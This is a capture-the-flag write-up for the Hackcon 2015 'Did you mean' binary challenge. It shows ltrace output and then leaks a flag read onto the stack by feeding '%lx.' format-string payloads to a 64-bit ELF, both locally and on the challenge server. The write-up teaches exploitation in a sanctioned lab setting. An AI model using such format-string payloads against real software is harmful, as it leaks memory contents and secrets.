# Hackcon 2015: Did you mean

**Category:** Pwnage
**Points:** 50
**Author:** [Aneesh Dogra](https://github.com/lionaneesh)
**Difficulty:** Medium
**Description:** 

[Pwnie](pwnie)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <http://vimvaders.github.io/hackcon2015/2015/08/20/did-you-mean.html>

### Meta

Keywords:

* Format String `fs`
* Difficulty: `beginner`

We are given a x86-64bit non-stripped ELF for Linux:

```bash
$ file pwnie
pwnie: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b87bef02278df740b6c0011e989f39b08ccfc998, not stripped
```

Running it:

```bash
$ ./pwnie
No!
```

`ltrace -f`:

```bash
$ ltrace -f ./pwnie 
[pid 3161] __libc_start_main(0x4006c0, 1, 0x7fff95c96be8, 0x4008b0 <unfinished ...>
[pid 3161] fopen("flag.txt", "r")                     = 0
[pid 3161] puts("No!"No!
)                                = 4
[pid 3161] fflush(0x7f5b83ac7400)                     = 0
[pid 3161] +++ exited (status 255) +++
```

Looks like we have to provide a flag file named `flag.txt` with a flag in it: `echo 'flag{thisisatestflag}' > flag.txt`

Running it again:

```bash
$ ./pwnie 
hello?
Did you say: 
hello?
```

It echos back whatever we are saying!

Trying a Stack Buffer Overflow:

```bash
$ p -c 'print "A"*0x200' | ./pwnie 
Did you say: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$
$ echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | wc
      0       1      99
```

Looks like we can't smash the stack and only provide up to `99`/`100` bytes of input.

We try to verify this again with `ltrace -f`:

```bash
$ ltrace -f ./pwnie 
[pid 3172] __libc_start_main(0x4006c0, 1, 0x7fff475ce218, 0x4008b0 <unfinished ...>
[pid 3172] fopen("flag.txt", "r")                     = 0xc6e010
[pid 3172] fgets("flag{thisisatestflag}\n", 100, 0xc6e010) = 0x7fff475ce060
[pid 3172] fgets(hello
"hello\n", 100, 0x7f51d851e640)      = 0x7fff475ce0c4
[pid 3172] strncmp("hello\n", "flag{thisisatestflag}\n", 10) = 2
[pid 3172] puts("Did you say: "Did you say: 
)                      = 14
[pid 3172] fflush(0x7f51d851e400)                     = 0
[pid 3172] __printf_chk(1, 0x7fff475ce0c4, 0, -1hello
)     = 6
[pid 3172] fflush(0x7f51d851e400)                     = 0
[pid 3172] +++ exited (status 0) +++
```

We see a `fopen` on our flag file and a `fgets` that reads the flag into the stack at `0x7fff475ce060`.

Afterwards, [`__printf_chk()`](http://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/libc---printf-chk-1.html) is called, with the second argument being the format string.

This smells like a format string vulnerability!

Let's test it:

```bash
$ p -c 'print "%x."*0x10' | ./pwnie
Did you say: 
0.ffffffff.bde88740.0.67616c66.61736973.67616c66.0.0.0.0.bdeac520.789e91b0.789e91a0.f63d4e2e.400436.
```

We can see that after providing several `%x` (read e.g. [here](https://www.exploit-db.com/docs/28476.pdf) how format string exploits work), several lower-case words in hexadecimal from the stack are printed.

Since we are dealing with `64`bit, our words are long words, we provide the long hex format `%lx`:

```bash
$ p -c 'print "%lx."*0x10' | ./pwnie 
Did you say: 
0.ffffffffffffffff.7fe653ab0740.0.6968747b67616c66.7473657461736973.a7d67616c66.0.0.0.0.7fe653ad4520.7fffab9a88a0.7fffab9a8890.f63d4e2e.400436.
```

If you look at the `5th` and `6th` long word, you can see hexadecimal output, which is human readable if converted to ASCII.

[This python script](./format-dump.py) dumps all long words considering little-endianess and zero-padding to the screen, which we then pipe to `xxd` to convert to binary.

Since the flag is stored on the stack, we should see the flag if we provide enough long words formats.

```bash
$ p format-dump.py 50 | xxd -r -p | xxd
0000000: 0000 0000 0000 0000 ffff ffff ffff ffff  ................
0000010: 40e7 e61b 4a7f 0000 0000 0000 0000 0000  @...J...........
0000020: 666c 6167 7b74 6869 7369 7361 7465 7374  flag{thisisatest
0000030: 666c 6167 7d0a 0000 0000 0000 0000 0000  flag}...........
0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000050: 0000 0000 0000 0000 2025 e91b 4a7f 0000  ........ %..J...
0000060: 9046 864c ff7f 0000 8046 864c ff7f 0000  .F.L.....F.L....
0000070: 2e4e 3df6 0000 0000 3604 4000 0000 0000  .N=.....6.@.....
0000080: ffff ffff 256c 782e 256c 782e 256c 782e  ....%lx.%lx.%lx.
0000090: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000a0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000b0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
```

We can clearly see the flag in the ASCII representation column of `xxd`.

If we test it on the remote server, we get the real flag, `FORMAT(str)`:

```bash
$ p format-dump.py 50 | xxd -r -p | xxd
0000000: 0000 0000 0000 0000 ffff ffff ffff ffff  ................
0000010: 4057 0b81 f67f 0000 0000 0000 0000 0000  @W..............
0000020: 464f 524d 4154 2873 7472 2900 f67f 0000  FORMAT(str).....
0000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000050: 0000 0000 0000 0000 2095 0d81 f67f 0000  ........ .......
0000060: 0077 0f93 ff7f 0000 f076 0f93 ff7f 0000  .w.......v......
0000070: 2e4e 3df6 0000 0000 3604 4000 0000 0000  .N=.....6.@.....
0000080: ffff ffff 256c 782e 256c 782e 256c 782e  ....%lx.%lx.%lx.
0000090: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000a0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000b0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
```

## Other write-ups and resources

 <http://vimvaders.github.io/hackcon2015/2015/08/20/did-you-mean.html>
